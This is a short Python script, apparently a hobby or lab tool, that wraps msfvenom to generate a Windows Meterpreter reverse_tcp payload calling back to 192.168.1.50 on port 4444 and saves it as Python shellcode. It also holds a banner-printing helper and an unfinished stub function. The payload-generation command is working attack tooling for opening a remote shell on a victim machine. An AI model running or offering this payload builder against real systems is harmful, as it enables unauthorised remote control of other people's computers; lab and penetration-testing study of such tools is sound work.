import os

def create_payload_msfvenom(lhost, lport, file):
	print('\n+ Creating payload ... \n')
	
	system_call = 'msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f python -o ' + file
	#print('\n'+system_call+'\n')

	result = os.system(system_call)
	
	if result == 0:
		print('\n+ Payload created and saved as: ' + file + '\n')
	else:
		print('\n+ Payload not created, something went wrong \n')

def transform_payload_msfvenom(file):
	print("hola")

def write_screen(message):
	spacesB = int(len(message)/2)
	spacesA = spacesB
	hyphen = int(len(message)*2)-1
	if (len(message)%2 == 0):
		spacesA -= 1

	print('+' + '-' * hyphen + '+')
	print('|' + ' ' * spacesB + message + ' ' * spacesA + '|')
	print('+' + '-' * hyphen + '+')


if __name__ == '__main__':
	print('\n')
	write_screen("Script started")

	create_payload_msfvenom('192.168.1.50','4444', 'payload.txt')


	write_screen("Script finished")
	print('\n')